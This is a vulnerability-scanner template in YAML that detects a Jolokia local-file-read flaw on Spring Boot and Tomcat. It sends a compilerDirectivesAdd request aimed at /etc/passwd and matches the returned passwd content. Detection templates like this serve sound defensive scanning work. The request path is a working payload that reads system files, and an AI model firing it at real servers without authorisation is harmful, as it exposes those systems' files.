id: "jolokia-file-read-compilerdirectivesadd"
name: "Jolokia - CompilerDirectivesAdd File Read"
severity: "high"
description: "Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd."
tech:
  - "springboot"
  - "tomcat"
tags:
  - "jolokia"
  - "springboot"
  - "tomcat"
  - "lfi"
  - "misconfig"
  - "vuln"
reference: "https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/"
spaExclusion: true
request:
  method: "GET"
  path: "/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
      - "compilerDirectivesAdd"
    condition: "and"
  - type: "status"
    status:
      - 200
